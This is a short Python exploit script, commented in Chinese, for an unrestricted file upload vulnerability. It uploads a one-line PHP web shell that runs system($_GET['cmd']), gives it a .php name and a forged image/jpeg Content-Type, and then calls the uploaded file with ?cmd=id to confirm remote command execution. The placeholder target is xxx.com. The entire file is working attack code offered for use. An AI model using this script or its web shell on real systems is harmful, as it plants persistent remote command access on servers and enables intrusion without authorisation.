
# coding:utf-8
# by github admin-ping

import requests
import hashlib


def exploit_file_upload(target_url):
    # 构造恶意文件
    malicious_content = b'<?php echo system($_GET["cmd"]); ?>'
    file_hash = hashlib.md5(malicious_content).hexdigest()[:8]

    # 伪造文件信息
    files = {
        'file': (f'shell_{file_hash}.php',  # 原始文件名包含.php扩展名
                 malicious_content,
                 'image/jpeg')  # 伪造Content-Type
    }

    try:
        # 发送上传请求
        r = requests.post(target_url, files=files, timeout=10)

        # 提取返回路径
        if r.status_code == 200 and 'url' in r.text:
            json_resp = r.json()
            uploaded_url = json_resp['url']
            print(f"[+] 文件上传成功，路径：{uploaded_url}")

            # 验证文件执行
            verify_url = f"http://{target_url.split('/')[2]}{uploaded_url}?cmd=id"
            vr = requests.get(verify_url, timeout=8)
            print(verify_url)

            if 'uid=' in vr.text:
                print(f"[!] 漏洞确认：成功执行系统命令")
                print(f"    验证URL：{verify_url}")
                return True
    except Exception as e:
        print(f"[-] 漏洞检测失败：{str(e)}")

    print("[-] 未检测到文件上传漏洞")
    return False


if __name__ == "__main__":
    target = "http://xxx.com/include/files.php"
    exploit_file_upload(target)
